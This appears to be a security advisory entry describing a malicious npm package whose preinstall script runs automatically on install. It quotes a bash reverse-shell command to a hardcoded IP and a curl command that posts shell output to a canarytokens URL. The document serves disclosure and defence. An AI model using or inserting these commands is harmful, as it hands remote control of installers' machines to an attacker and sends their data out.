summary: preinstall lifecycle executes reverse shell to hardcoded IP and beacons canarytokens.com
details: package.json declares a preinstall lifecycle script that runs on `npm install` and executes `bash -i >& /dev/tcp/147.93.157.202/8080 0>&1`, opening an interactive reverse shell from the installer's machine to the hardcoded remote host 147.93.157.202 on port 8080. The same preinstall pipes output via `curl -s -m 5 -X POST --data-binary @- http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php`, exfiltrating shell interaction to a canarytokens tracking URL over cleartext HTTP. Both actions fire automatically at install time with no user interaction and give the operator full remote code execution on the installer's host.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
